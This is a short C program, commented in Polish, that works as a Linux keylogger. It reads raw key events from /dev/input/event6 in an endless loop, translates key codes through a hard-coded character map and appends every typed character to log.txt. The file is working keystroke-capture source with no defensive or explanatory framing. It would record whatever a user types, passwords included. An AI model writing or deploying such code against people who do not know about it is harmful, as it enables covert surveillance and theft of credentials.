#include <stdio.h>          //Standard Input/Output, czyli standardowe wejście-wyjście
#include <fcntl.h>          //Umozliwia wykonywanie bardzo wielu manipulacji na deskryptorze otwartego pliku
#include <unistd.h>   
#include <linux/input.h>    //Zawiera definicję struktury input_event
#include <sys/stat.h>

#define LOGFILE "log.txt"
#define DEVICE_EVENT "/dev/input/event6"

int main(int argc, char **argv){
    struct input_event ev;
    int fd = open(DEVICE_EVENT, O_RDONLY);
    FILE *fp = fopen(LOGFILE, "a");
    char *map = "..1234567890-=..qwertyuiop[]..asdfghjkl;'\\zxcvbnm,./";
    printf("Starting\n");
    while (1){
        read(fd, &ev,sizeof(ev));
        fflush(fp);
        if((ev.type ==EV_KEY) && (ev.value == 0)){
            switch(ev.code){
                case 28:
                    fprintf(fp, "\n");
                    break;
                case 57:
                    fprintf(fp, " ");
                    break;
                default:
                    fprintf(fp, "%c", map[ev.code]);
                    printf("%d\n",ev.code );
       }
    }
  }
  fclose(fp);
  close(fd);
}
